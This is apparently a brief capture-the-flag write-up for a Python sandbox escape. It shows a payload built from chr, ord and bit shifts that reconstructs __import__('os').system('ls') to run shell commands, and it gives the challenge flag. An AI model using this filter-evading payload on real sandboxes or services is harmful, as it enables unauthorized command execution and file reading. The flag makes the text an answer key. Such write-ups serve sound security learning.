There are a few solutions, but the key to note here is that you are given `chr`, `ord`, and `join` for free, which along with `+1` (and `<<` for brevity) allows you to construct any arbitrary string. Attached below is the `ls` payload, just change it to `cat` once you know the file name.

```bash
>>> ''.join(['__impo', ('r' + chr(ord('r') + 1 +1)), '__(', chr(((1 << 1 << 1 << 1 << 1) + 1) << 1), 'o', chr(ord('r')+1), chr(((1 << 1 << 1 << 1 << 1) + 1) << 1),').', chr(ord('r') + 1), 'y', chr(ord('r') + 1), chr(ord('r') + 1 + 1), 'em(', chr(((1 << 1 << 1 << 1 << 1) + 1) << 1), 'ls', chr(((1 << 1 << 1 << 1 << 1) + 1) << 1), ')' ] )
```

Flag is `wctf{th3_gr34t_esc4p3_&&}`